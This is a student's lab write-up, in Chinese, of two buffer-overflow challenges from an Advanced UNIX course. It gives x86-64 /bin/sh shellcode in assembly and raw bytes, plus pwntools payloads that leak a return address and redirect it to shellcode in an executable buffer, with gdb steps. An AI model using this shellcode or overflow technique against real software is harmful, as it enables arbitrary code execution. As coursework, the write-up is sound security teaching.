# Lab5 Buffer overflow

## Challenge #1 Shellcode
>  try to invoke a shell, e.g., /bin/sh
```c
int main() {
	char buf[512];
	shellcode_t code = (shellcode_t) buf;

	setvbuf(stderr, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin,  NULL, _IONBF, 0);

	if(getenv("NO_SANDBOX") == NULL)
		sandbox();

	printf("Enter your code> ");
	read(0, buf, sizeof(buf));
	code();

	return 0;
}
```
只需將網路上查到的/bin/bash的shellcode直接輸入到code裡面即可
https://github.com/imbianyunren/Adv_UNIX_2024/blob/main/Lab5/chal_1.py
可以使用asm實作 或是直接拿別人寫好一行的code
```python
codes = """
    xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
"""
payloads = asm(codes)
```
```python!
payloads = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
```

## Challenge #2 buffer overflow with no canary
我把注解放在原始code裡面
```c=!
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <seccomp.h>
#include <sys/mman.h>

static char msg[512];

int task() {
	char buf[32]; // buffer只有開32

	printf("===========================================\n");
	printf("Welcome to the UNIX Hotel Messaging Service\n");
	printf("===========================================\n");

	printf("\nWhat's your name? ");
	read(0, buf, 256); // buffer只有開32，可是這裡可以輸入256bytes, 可以從這裡輸入超過buf大小的內容
	printf("Welcome, %s", buf); // 這邊有機會能夠吐出後面多餘的內容(因為read會一路讀到記憶體內容為0為止)

	printf("\nWhat's the room number? ");
	read(0, buf, 256);
	printf("The room number is: %s", buf);

	printf("\nWhat's the customer's name? ");
	read(0, buf, 256);
	printf("The customer's name is: %s", buf);

	printf("\nLeave your message: ");
	read(0, msg, sizeof(msg)); //msg這個參數有使用mrprotect賦予exec參數，所以要把/bin/sh的shellcode放在這裡
	printf("Thank you!\n");

	return 0;
}

int main() {
	setvbuf(stderr, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin,  NULL, _IONBF, 0);
	if(mprotect((void *) (((long) msg) & 0xfffffffffffff000L), 4096, PROT_READ|PROT_WRITE|PROT_EXEC) != 0) {
		perror("mprotect");
	} else {
		task();
	}
	return 0;
}
```
整體來說基本上是利用buf這個參數會overflow吐出記憶體後面的內容
```python=
payloads = b'A'*40 
r.recvuntil(b'name? ')
r.send(payloads)

z = r.recvline()
print(z)
print(u64(z.split(b'A'*40)[1][:-1].ljust(8,b'\x00')))
addr = u64(z.split(b'A'*40)[1][:-1].ljust(8,b'\x00'))
print(hex(addr))
```
老師一開始是說直接在buf送40個A去看會吐出甚麼:
```!
b'Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe4\xaa\xa0\xa5\xc4\x7f\n'

0x7fc4a5a0aae4 <-後面吐出來的hex
```

可以看到後面吐出一串東西，再從gdb-peda設斷點在`main`, `read(0, buf, 256)`來觀察記憶體內容
```
In terminal
-> gdb
-> file ./bof1
-> b 22 (read(0, buf, 256))
-> b 23 (輸入完觀察記憶體用)
-> b 35
-> r
```

執行run後可以看到要輸入buf的位置在rbp-0x20(32)，這也是為什麼要輸入40個字(A)，因為蓋過去後後面輸出的內容就會是rbp+08(return address)

![image](https://hackmd.io/_uploads/SyQXF824R.png)


OR可以在輸入完40個A後在gdb輸入`x/32x $rsp`看現在stack裡面內容
![image](https://hackmd.io/_uploads/r1NUfv2EA.png)

從下面圖(老師上課的圖不是題目的)可以看到rbp+08存的是return address，最後task()執行完要回main的時候會來這裡照rbp+08裡面地址執行
![image](https://hackmd.io/_uploads/B1F2tI34A.png)


(更: 測試時發現gdb執行他發現溢位的話會變成`7ffff7f2ea0a`，但如果是在./chal_1.py執行時會正常溢出要的位置，所以**7ffff7f2eae4才是ret address**)
所以`7ffff7f2eae4`就是return address，且也是在輸入40個A後後面會吐出的字串內容
![image](https://hackmd.io/_uploads/SJcdiw2NA.png)


那msg的地址在哪裡?把斷點設`在35行	printf("Thank you!\n");`看看
他會執行到`leave message:`，接著在這邊輸入隨便一組字`('123')`，在下一行到print(thank you)會停下
![image](https://hackmd.io/_uploads/B1v_bvn4C.png)
此時看剛輸入的`123`就在`$rsi`裡，msg地址是`0x7ffff7ff91e0`

所以我們從中得到:
Return Address: $rbp+8 = 0x7ffff7f2eae4
msg Address: 0x7ffff7ff91e0
兩者距離: 
Hex value: 7ffff7ff91e0 – 7ffff7f2eae4 = **CA6FC**

### 攻擊邏輯
1. 第一次輸入buf時取得ret addr = 7ffff7f2eae4
2. 將前面計算好ret addr與msg距離放入下一次要輸入buf的payload
```python
msg = addr + int("0xCA6FC",16) #msg addr
payloads = b'A'*40 + p64(msg, endian='little')
r.send(payloads)
```
3. 在leave msg那行放入shellcode
```python
r.send(shellcode)
```
4. 等最後要return時就會直接去執行msg的地址，也就是shellcode
5. 測試ls, cat file可不可以執行
![image](https://hackmd.io/_uploads/HJqfawnVC.png)


